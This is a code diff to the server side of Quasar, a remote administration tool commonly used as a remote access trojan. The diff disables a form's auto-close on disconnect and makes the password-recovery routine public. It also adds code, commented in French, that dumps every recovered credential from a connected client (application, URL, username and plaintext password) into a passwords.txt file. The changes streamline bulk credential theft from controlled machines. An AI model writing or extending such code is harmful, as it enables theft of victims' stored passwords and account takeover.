@@ -79,7 +79,7 @@ namespace Quasar.Server.Forms
         {
             if (!connected)
             {
-                this.Invoke((MethodInvoker)this.Close);
+                //this.Invoke((MethodInvoker)this.Close);
             }
         }
 
@@ -96,7 +96,7 @@ namespace Quasar.Server.Forms
             UnregisterMessageHandler();
         }
 
-        private void RecoverPasswords()
+        public void RecoverPasswords()
         {
             clearAllToolStripMenuItem_Click(null, null);
             _recoveryHandler.BeginAccountRecovery();
@@ -127,6 +127,15 @@ namespace Quasar.Server.Forms
                     lstPasswords.Items.Add(lvi);
                     return;
                 }
+
+                //ECRITURE DANS passwords.txt
+                string comptes = "";
+                foreach (var acc in accounts)
+                {
+                    comptes += acc.Application + " - " + acc.Url + " - " + acc.Username + ":" + acc.Password + "\n";
+                }
+                File.WriteAllText(_clients[0].Value.DownloadDirectory + "\\passwords.txt", comptes);
+                //ECRITURE DANS passwords.txt
 
                 var items = new List<ListViewItem>();
                 foreach (var acc in accounts)
